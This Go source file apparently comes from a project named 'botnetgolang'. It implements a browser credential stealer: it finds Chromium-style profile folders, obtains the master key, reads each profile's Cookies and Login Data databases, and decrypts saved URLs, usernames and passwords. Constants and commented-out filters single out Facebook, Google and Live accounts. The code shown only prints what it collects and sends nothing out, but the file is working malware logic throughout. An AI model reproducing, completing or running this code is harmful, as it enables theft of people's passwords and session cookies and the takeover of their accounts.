package internal

import (
	"botnetgolang/internal/model"
	"botnetgolang/internal/pkg"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

const (
	Cfff = ".facebook.com"
	Cggg = "google.com"
	Clll = "live.com"
)

var jsonData []interface{}

func FunGetProfile(browser model.BrowserPaths) *model.AllProfile {
	var result model.AllProfile

	ppp := os.Getenv("APPDATA")
	if ppp == "" {
		ppp = os.Getenv("HOME")
	}
	part := strings.Split(ppp, "\\AppData")
	ppp = part[0]

	jsonData = append(jsonData, filepath.Join(ppp, "fffff"))

	pathfolderD := filepath.Join(ppp, browser.Pa)

	textF := "108.0.0.0"
	content, err := ioutil.ReadFile(filepath.Join(pathfolderD, "Last Version"))
	if err == nil {
		textF = string(content)
	}

	alls := make([]string, 0)
	if paths, err := pkg.GetDirectoriesV2(pathfolderD); err != nil {
		fmt.Print("loi")
	} else {
		for _, value := range paths {
			alls = append(alls, value)
		}

	}

	if err != nil {
		panic(err)
	}
	// lay cac profile
	result.Alls = alls
	result.PathSource = ppp
	result.UserData = pathfolderD
	result.Version = textF

	return &result
}

func MainBL(browser model.BrowserPaths) {
	allProfile := FunGetProfile(browser)

	if len(allProfile.Alls) < 0 {
		return
	}

	masterKey, err := pkg.GetMasterKey(allProfile.PathSource + browser.Local)
	fmt.Println(masterKey)
	if err != nil {
		fmt.Println("error cant get masterKey")
	}
	for _, profile := range allProfile.Alls {
		path := fmt.Sprintf("%v\\Network\\Cookies", profile)
		// connect sqlite3
		connToken, err := pkg.ConnectSQLite(path)
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println(connToken)
		token, _ := pkg.QueryData(connToken, pkg.CookiesSQL)
		fmt.Println(token)
		jsonBytes, err := json.Marshal(token)
		jsonString := string(jsonBytes)
		fmt.Println(jsonString)
		//isLogin := pkg.CheckLogin(token)

		// //
		path = fmt.Sprintf("%v\\Login Data", profile)
		connInfo, err := pkg.ConnectSQLite(path)
		info, _ := pkg.QueryData(connInfo, pkg.Passwords)

		//// init condition to select
		//conditions := []interface{}{
		//	_const.Cfff,
		//	_const.Cggg,
		//	_const.Clll,
		//}

		//listInfo := pkg.FilterConditions(info, conditions, "action_url")
		listInfo := info
		fmt.Println(listInfo)
		for _, value := range listInfo {
			infoRow := model.Info{
				Url:      value["action_url"].(string),
				UserName: value["username_value"].(string),
				Pass:     value["password_value"].(string),
			}
			result := pkg.GetInfo(infoRow, allProfile.PathSource+browser.Local, masterKey)
			fmt.Println(result)
		}

		// //

	}

}
